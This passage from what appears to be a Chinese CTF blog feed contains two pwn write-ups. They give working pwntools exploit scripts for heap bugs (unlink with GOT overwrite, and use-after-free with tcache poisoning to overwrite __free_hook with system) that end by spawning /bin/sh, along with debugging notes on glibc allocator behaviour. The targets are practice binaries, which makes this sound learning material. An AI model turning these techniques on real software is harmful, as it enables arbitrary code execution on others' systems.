<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230014783.png" alt="image-20251201230014783"></p>
<p>② 接下来执行<code>third_fd = first_addr</code>，即third_chunk的fd由由原来指向fake_chunk地址更改成first_chunk地址：</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201230046906.png" alt="image-20251201230046906"></p>
<p>这里需要注意的是<code>third_chunk的fd</code>与<code>first_chunk的bk</code>更改的其实是一个位置，但是由于third_fd &#x3D; first_addr<code>后执行</code>，所以此处内容会从0x602140被覆盖成0x602138。</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201220335322.png" alt="image-20251201220335322"></p>
<p>总结一下：最终利用的是修改third chunk(fake chunk)的fd指向数组n。</p>
<p>后续通过数组n实现任意地址写：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pay2 = p64(<span class="number">0</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) </span><br><span class="line">gdb.attach(p)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(pay2),pay2)</span><br></pre></td></tr></table></figure>

<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251201220933985.png" alt="image-20251201220933985"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = p64(hollkelf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload) //把free覆盖成puts函数</span><br><span class="line">puts_addr = hollk.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line">log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure>





<p>触发system(binsh)</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = p64(system_addr)</span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload) //把auti覆盖成system</span><br><span class="line">p.send(p64(binsh_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>editable_note</title>
    <url>/2025/12/03/editable_note/</url>
    <content><![CDATA[<h1 id="editable-note"><a href="#editable-note" class="headerlink" title="editable_note"></a>editable_note</h1><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203210748426.png" alt="image-20251203210748426"></p>
<p>艾我也喜欢攻破靶机的感觉。</p>
<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu:"></a>menu:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203210953023.png"></p>
<h3 id="add"><a href="#add" class="headerlink" title="add:"></a>add:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203211025974.png" alt="image-20251203211025974"></p>
<h3 id="delete"><a href="#delete" class="headerlink" title="delete:"></a>delete:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203211056868.png" alt="image-20251203211056868"></p>
<h3 id="edit"><a href="#edit" class="headerlink" title="edit:"></a>edit:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203211153251.png" alt="image-20251203211153251"></p>
<h3 id="show"><a href="#show" class="headerlink" title="show:"></a>show:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203211227251.png" alt="image-20251203211227251"></p>
<p><strong>这个题是典型的<code>uaf </code>+ <code>tache posioning</code></strong></p>
<h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc:"></a>泄露<code>libc</code>:</h3><p>通过<code>unsorted bin</code>泄露<code>main_arena</code>进而泄露<code>Libc</code></p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">p = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.anna.nssctf.cn&quot;,25397)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">leng,color</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(leng))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(color))</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">id1</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1))	</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">id1</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1))	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">id1,name</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1))	</span><br><span class="line">	p.sendafter(<span class="string">&#x27;Content:&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x20</span>) // 防止于top chunk合并</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;main_arena: <span class="subst">&#123;<span class="built_in">hex</span>(main_arena)&#125;</span>&quot;</span>)</span><br><span class="line">libcbase = main_arena - <span class="number">0x1ecbe0</span></span><br><span class="line">log.success(<span class="string">f&quot;libcbase: <span class="subst">&#123;<span class="built_in">hex</span>(libcbase)&#125;</span>&quot;</span>)</span><br><span class="line">free_hook = libcbase + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;libcbase: <span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;libcbase: <span class="subst">&#123;<span class="built_in">hex</span>(free_hook)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>



<p>这里先申请8个同样大小的chunk 七个用来填满<code>tache bin</code>  另一个用来释放进入<code>unsorted bin </code> </p>
<p>可以看到<code>chunk7</code> 的fd和bk都指向<code>main_arena</code></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203212520431.png" alt="image-20251203212520431"></p>
<h4 id="🐖："><a href="#🐖：" class="headerlink" title="🐖："></a>🐖：</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">8</span>,<span class="number">0x20</span>) // 防止于top chunk合并</span><br></pre></td></tr></table></figure>

<p> 最开始做的时候没有加这个</p>
<p>导致这个chunk 释放后会和top chunk合并 而不是进入unsorted bin::</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">#add(8,0x20)</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203213410982.png" alt="image-20251203213410982"></p>
<p>可以看到没有进入ub 且top chunk的地址发生了变化。</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203213429481.png" alt="image-20251203213429481"></p>
<h4 id="🐖：-1"><a href="#🐖：-1" class="headerlink" title="🐖："></a>🐖：</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x20</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">8</span>) <span class="comment">###try</span></span><br></pre></td></tr></table></figure>

<p>这里好奇尝试了一下释放这个chunk8 但是他没有和top chunk合并。因为进入<code>tache </code>的优先级高于top chunk 合并</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203213842185.png" alt="image-20251203213842185"></p>
<h3 id="uaf-posioning"><a href="#uaf-posioning" class="headerlink" title="uaf + posioning:"></a>uaf + <code>posioning</code>:</h3><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">9</span>,<span class="number">0x20</span>)  /// </span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x20</span>) ///</span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">9</span>,p64(free_hook))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>有点像double free</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203221329698.png" alt="image-20251203221329698"></p>
<p>这里的<code>0x690</code>是chunk9 <code>0x720</code>是chunk8</p>
<p><code>tache</code>是 LIFO（后进先出）</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222111156.png" alt="image-20251203222111156"></p>
<p>chunk9相当于头指针 chunk8是尾指针</p>
<p>这里修改<code>chunk9</code>的next指针就可以劫持<code>tahce</code></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203221237988.png" alt="image-20251203221237988"></p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x20</span>) // __free_hook</span><br><span class="line">edit(<span class="number">12</span>,p64(system))</span><br><span class="line">dele(<span class="number">10</span>) //触发system(/<span class="built_in">bin</span>/sh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>这样就打通了。</p>
<h4 id="🐖：-2"><a href="#🐖：-2" class="headerlink" title="🐖："></a>🐖：</h4><p>在调试的时候发现重新申请chunk的时候会优先用unsortedbin部分的chunk</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">9</span>,<span class="number">0x20</span>)    ///<span class="number">1</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>)   ///<span class="number">2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x20</span>)   ///<span class="number">3</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x20</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>初始状态：</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222607081.png" alt="image-20251203222607081"></p>
<h5 id="1"><a href="#1" class="headerlink" title="1:"></a>1:</h5><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222709430.png" alt="image-20251203222709430"></p>
<h5 id="2"><a href="#2" class="headerlink" title="2:"></a>2:</h5><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222723903.png" alt="image-20251203222723903"></p>
<p>可以看到<code>glibc</code>优先分配的是<code>unsortedbin</code>中的chunk</p>
<h5 id="3"><a href="#3" class="headerlink" title="3:"></a>3:</h5><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222735752.png" alt="image-20251203222735752"></p>
<p><code>unsortedbin</code>分配完后 会从top chunk中分割。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
</search>
